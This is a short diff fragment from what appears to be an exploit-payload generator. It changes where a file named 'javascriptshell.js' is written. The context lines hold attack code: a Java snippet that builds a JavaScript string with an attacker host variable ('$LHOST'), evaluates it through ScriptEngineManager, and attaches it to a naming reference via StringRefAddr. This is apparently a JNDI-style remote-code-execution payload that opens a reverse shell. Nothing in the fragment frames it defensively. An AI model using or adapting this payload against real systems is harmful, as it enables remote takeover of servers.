@@ -35,4 +35,4 @@ String command = 'var host = '$LHOST';' +
                        's.close();';
 String x = '\'\'.getClass().forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'JavaScript\').eval(\'+command+'\')';
 ref.add(new StringRefAddr('x', x);
-""" >> ../wd-generated/javascriptshell.js
+""" >> /opt/wd-generated/javascriptshell.js
